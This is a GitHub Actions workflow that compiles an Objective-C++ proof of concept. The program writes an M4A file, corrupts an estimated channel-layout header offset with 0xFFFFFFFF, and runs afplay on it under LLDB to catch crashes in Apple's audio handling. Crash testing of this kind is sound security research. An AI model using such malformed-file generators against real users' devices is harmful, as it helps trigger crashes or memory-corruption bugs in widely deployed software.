name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l

      # Updated: Patch encodeme.mm to manually corrupt the channel layout.
      - name: Patch encodeme.mm to corrupt the channel layout
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to generate and then corrupt the channel layout..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #import <AudioToolbox/AudioToolbox.h>
          #include <string.h>

          // Helper function to write a valid, short M4A file
          bool createValidM4A(const char* path) {
              NSString *fileName = [NSString stringWithUTF8String:path];
              CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)fileName, kCFURLPOSIXPathStyle, false);

              AudioStreamBasicDescription asbd = {0};
              asbd.mSampleRate = 44100;
              asbd.mFormatID = kAudioFormatMPEG4AAC;
              asbd.mFramesPerPacket = 1024;
              asbd.mChannelsPerFrame = 1;

              AudioFileID audioFile;
              OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
              if (status != noErr) return false;

              // Write a few packets of silent data
              UInt32 numPacketsToWrite = 5;
              UInt32 packetByteSize = 256;
              char dummy_data[packetByteSize];
              memset(dummy_data, 0, sizeof(dummy_data));
              
              for (UInt32 i = 0; i < numPacketsToWrite; ++i) {
                  AudioStreamPacketDescription packetDesc = {0};
                  packetDesc.mDataByteSize = packetByteSize;
                  UInt32 packetsInThisWrite = 1;
                  status = AudioFileWritePackets(audioFile, false, packetByteSize, &packetDesc, i, &packetsInThisWrite, dummy_data);
                  if (status != noErr) break;
              }
              
              AudioFileClose(audioFile);
              CFRelease(fileURL);
              return status == noErr;
          }

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

                  const char* fileName = "output_channel_corruption.m4a";

                  // Step 1: Create a valid M4A file.
                  if (!createValidM4A(fileName)) {
                      fprintf(stderr, "Failed to create a valid base M4A file.\n");
                      return 1;
                  }
                  fprintf(stderr, "Successfully created a valid M4A file.\n");

                  // Step 2: Re-open the file and manually corrupt a header field.
                  FILE *file = fopen(fileName, "r+b"); // Open for binary read/write
                  if (!file) {
                      fprintf(stderr, "Failed to re-open the M4A file for corruption.\n");
                      return 1;
                  }

                  // PoC: Manual Corruption of the Channel Layout
                  // The 'stsd' atom contains the sample description, which includes the channel layout.
                  // By corrupting the mChannelLayoutTag, we can try to trigger a crash in the
                  // audio processing pipeline, not just the initial file parser.
                  // This offset is an estimate for where the tag is located.
                  fseek(file, 0x150, SEEK_SET);
                  
                  // This value (0xFFFFFFFF) is an invalid channel layout tag.
                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
                  
                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
                  fclose(file);

                  fprintf(stderr, "PoC: Manually corrupted the 'mChannelLayoutTag' in the M4A file.\n");
                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile encodeme.mm with debug symbols
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm with debug symbols (-g)..."
          clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_debug
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # Run and Verify File Generation
      - name: Run and Verify File Generation
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          ./encodeme_debug
          echo "File 'output_channel_corruption.m4a' generated."
          ls -l output_channel_corruption.m4a
          
      # Launch the player directly under LLDB to catch any startup crashes
      - name: Launch Player Under LLDB to Catch Startup Crashes
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with corrupted channel layout ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will stop if a crash occurs.
          run
          # If the process crashed, get the backtrace. If it exited normally, this shows the state at exit.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
          # Execute afplay with the invalid file as an argument, under the control of the LLDB script.
          # We add '|| true' because afplay might exit with an error, which we expect.
          lldb -s player_debug_script.lldb -- afplay output_channel_corruption.m4a >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts: the invalid M4A and the player debug log
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: audio-and-debug-artifacts
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_channel_corruption.m4a
            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
